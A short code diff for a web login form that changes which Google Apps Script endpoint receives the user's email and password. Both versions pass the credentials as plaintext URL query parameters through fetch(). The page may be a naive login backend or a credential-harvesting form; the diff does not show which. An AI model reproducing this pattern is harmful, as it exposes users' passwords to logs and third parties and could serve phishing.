@@ -4,7 +4,7 @@ document.getElementById("loginForm").addEventListener("submit", function (e) {
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
 
-  fetch("https://script.google.com/macros/s/AKfycbyHtpZPMUTElXDaeh_aPCuXvozmFbVBbm2ibj9WZCjngqxS06yPHARwuyNBkif_NOs0/exec?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password))
+  fetch("https://script.google.com/macros/s/AKfycbwk2-XTYuf6sDUlGEwQu8_3M_jHtHBmaMaWY-4ueOv7jPJ2op4LCjW1eIdvbalxxvEs/exec?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password))
     .then(res => res.json())
     .then(data => {
       if (data.success) {
